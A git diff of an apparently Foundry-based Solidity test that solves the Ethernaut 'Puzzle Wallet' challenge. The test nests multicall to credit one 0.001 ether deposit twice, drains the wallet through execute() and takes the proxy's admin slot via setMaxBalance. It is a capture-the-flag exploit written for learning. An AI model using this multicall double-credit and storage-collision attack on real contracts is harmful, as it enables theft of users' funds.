@@ -4,6 +4,8 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../utils.sol";
 
+// this interface is a composition of
+// PuzzleProxy and PuzzleWallet
 interface ITarget {
   function proposeNewAdmin(address) external;
   function addToWhitelist(address) external;
@@ -28,40 +30,40 @@ contract PuzzleWalletTest is Test {
     // now we can be added to the whitelist (we are the owner)
     target.addToWhitelist(address(this));
 
-    // to win the level
-    // - setMaxBalance()
-    //   will switch admin/maxBalance to our address
-    //   but we need to comply with address(this).balance == 0
-    // - execute()
-    //   now, this one requires balances[msg.sender] >= value
-    // - deposit()
-    //   takes the msg.value we send and puts it into the contract
-    //   incrementing our value at balance[]
-    // - multicall gives you a way to run deposit() twice
-    //   transfering to the contract 0.001 ether BUT
-    //   crediting your balance[] as 0.002
-    //   its flaw is that its control, depositCalled
-    //     won't detect if you are calling the function
-    //     from multicall() itself
+    // we want to bundle dhe same deposit twice in this way
+    // multicall_0 - deposit
+    //             - multicall_1 - deposit
+
+    // let's craft the deposit call
     bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
 
-    bytes[] memory params = new bytes[](1);
-    params[0] = depositCalldata;
-    bytes memory multicallCallData = abi.encodeWithSignature("multicall(bytes[])", params);
+    // bundle deposit into into multicall_1
+    bytes[] memory multicall1Params = new bytes[](1);
+    multicall1Params[0] = depositCalldata;
+    bytes memory multicall1CallData = abi.encodeWithSignature("multicall(bytes[])", multicall1Params);
 
-    bytes[] memory multicallInput = new bytes[](2);
-    multicallInput[0] = depositCalldata;
-    multicallInput[1] = multicallCallData;
+    // bundle deposit (again) and multicall_1
+    bytes[] memory multicall0Params = new bytes[](2);
+    multicall0Params[0] = depositCalldata;    // reusing deposit
+    multicall0Params[1] = multicall1CallData; // are you confused enough?
 
-    target.multicall{value: 0.001 ether}(multicallInput);
+    // now we can do the call
+    // while we have a msg.value of 0.001 ether,
+    // deposit() will be called twice,
+    // giving us a balance of 0.002 ether
+    target.multicall{value: 0.001 ether}(multicall0Params);
 
-    // as our balance[] is 0.002, we can call execute(), draining the contract
+    // as our balance is 0.002, we can call execute(), draining the contract
+    // don't forget to set up receive() in this contract
     bytes memory b;
-    target.execute(0x0000000000000000000000000000000000000000, 0.002 ether, b);
+    target.execute(address(this), 0.002 ether, b);
 
     // and now we can modify slot1 which is admin/maxBalance
     target.setMaxBalance(uint160(address(this)));
 
     utils.submitLevelInstance(challengeAddress);
   }
+
+  // get the funds or the attack will revert
+  receive() external payable {}
 }
